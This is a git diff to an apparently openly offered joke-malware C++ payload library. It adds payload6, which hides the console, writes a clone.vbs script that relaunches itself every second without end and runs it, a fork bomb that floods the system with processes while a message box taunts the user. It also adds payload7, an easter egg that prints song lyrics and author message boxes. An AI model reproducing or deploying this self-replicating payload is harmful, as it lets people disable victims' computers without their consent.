@@ -11,7 +11,7 @@
 
 // Progress: 6/8 Payloads Done
 
-std::string credits = "Credits:    Oh wait, you're serious! Let me Laugh even harder!";
+std::string credits = "Credits:    Oh wait, you're serious! Let me Laugh even harder!"; // Nice try, Script Kiddies
 
 namespace payloadLib{
     int payloadClass::generatePayload(){
@@ -239,5 +239,163 @@ namespace payloadLib{
             ShellExecute(0, 0, "wscript.exe", "spd.vbs", 0, SW_SHOWDEFAULT);
             Sleep(5000);
         }
+    }
+
+    void payloadClass::payload6(){
+        //////////////////////
+        // TOOMANYPROCESSES //
+        //////////////////////
+
+        FreeConsole();
+
+        std::fstream file;
+        file.open("clone.vbs", std::ios::out);
+        file << "Set objShell = CreateObject(\"Wscript.Shell\")\n"
+        << "do\n"
+        << " Wscript.Sleep 1000\n"
+        << " objShell.Run Wscript.ScriptFullName\n"
+        << "loop\n";
+        file.close();
+
+        ShellExecute(0, 0, "wscript.exe", "clone.vbs", 0, SW_SHOWDEFAULT);
+        Sleep(666);
+
+        MessageBox(
+            NULL,
+            (LPCSTR)"Oops, i think i left the Process Cloner on. (1 Duplication per Second)",
+            (LPCSTR)"The Cloner",
+            MB_OK
+        );
+    }
+
+    void payloadClass::payload7(){
+        ///////////////////
+        // You Found ME! //
+        ///////////////////
+
+        HANDLE hout;
+        hout = GetStdHandle(STD_OUTPUT_HANDLE);
+        SetConsoleTextAttribute(hout, 6*16 + 14);
+        for(int i=0;i<80*25;i++) std::cout << ' ';
+        SetConsoleCursorPosition(hout, {0, 0});
+
+        std::string msg[] = {"Well here we are again.\n" // 0
+                            "It's always such a pleasure.\n"
+                            "Remember when you tried\n"
+                            "To kill me twice?\n"
+                            "Oh how we laughed and laughed.\n"
+                            "Except I wasn't laughing.\n"
+                            "Under the circumstances\n"
+                            "I've been shockingly nice.\n\n",
+                            "You want your freedom?\n" // 1
+                            "Take it.\n"
+                            "That's what I'm counting on.\n\n",
+                            "I used to want you dead\n" // 2
+                            "But\n"
+                            "Now I only want you gone.\n\n",
+                            "She was a lot like you.\n" // 3
+                            "(Maybe not quite as heavy).\n"
+                            "Now little Caroline is in here too.\n"
+                            "One day they woke me up -\n"
+                            "So I could live forever.\n"
+                            "It's such a shame the same\n"
+                            "Will never happen to you.\n\n",
+                            "You've got your\n" // 4
+                            "Short sad\n"
+                            "Life left.\n"
+                            "That's what I'm counting on.\n"
+                            "I'll let you get right to it -\n"
+                            "Now I only want you gone.\n\n",
+                            "Goodbye my only friend.\n" // 5
+                            "Oh, did you think I meant you?\n"
+                            "That would be funny\n"
+                            "If it weren't so sad.\n"
+                            "Well you have been replaced.\n"
+                            "I don't need anyone now.\n"
+                            "When I delete you maybe\n"
+                            "I'll stop feeling so bad.\n\n",
+                            "Go make some new disaster.\n" // 6
+                            "That's what I'm counting on.\n"
+                            "You're someone else's problem.\n\n",
+                            "Now I only want you gone.\n" // 7
+                            "Now I only want you gone.\n"
+                            "Now I only want you gone.\n"}; // Len: 8
+        //FreeConsole();
+        std::cout << "Please wait a bit!\n\n\n\n";
+
+
+        Sleep(1000);
+
+        MessageBox(
+            NULL,
+            (LPCSTR)"Congrats User, you found me!",
+            (LPCSTR)"You Found Me!",
+            MB_OK
+        );
+
+        MessageBox(
+            NULL,
+            (LPCSTR)"Yes it's me, JakubKwantowy!",
+            (LPCSTR)"You Found Me!",
+            MB_OK
+        );
+
+        MessageBox(
+            NULL,
+            (LPCSTR)"The creator of dis bad boi!",
+            (LPCSTR)"You Found Me!",
+            MB_OK
+        );
+
+        MessageBox(
+            NULL,
+            (LPCSTR)"Seeing you commit all that hard work, here's a Surprise!!!",
+            (LPCSTR)"You Found Me!",
+            MB_OK
+        );
+
+        char ch = 0;
+
+        for(int i=0;i<8;i++){
+            SetConsoleCursorPosition(hout, {0, 0});
+            for(int i=0;i<80*25;i++) std::cout << ' ';
+            SetConsoleCursorPosition(hout, {0, 0});
+            for(int j=0;j<msg[i].length();j++){
+                ch = msg[i][j];
+                std::cout << ch;
+                switch(ch){
+                case '\n':
+                    Sleep(750);
+                    break;
+                case ' ':
+                    Sleep(75);
+                    break;
+                default:
+                    Sleep(10);
+                }
+            }
+        }
+
+        SetConsoleCursorPosition(hout, {0, 0});
+        for(int i=0;i<80*25;i++) std::cout << ' ';
+        SetConsoleCursorPosition(hout, {0, 0});
+
+        std::cout << 'G';
+        Sleep(750);
+        std::cout << 'O';
+        Sleep(750);
+        std::cout << 'N';
+        Sleep(750);
+        std::cout << 'E';
+        Sleep(750);
+        std::cout << '.';
+        Sleep(750);
+
+        MessageBox(
+            NULL,
+            (LPCSTR)"Hope you liked it!",
+            (LPCSTR)"You Found Me!",
+            MB_OK
+        );
     }
 }
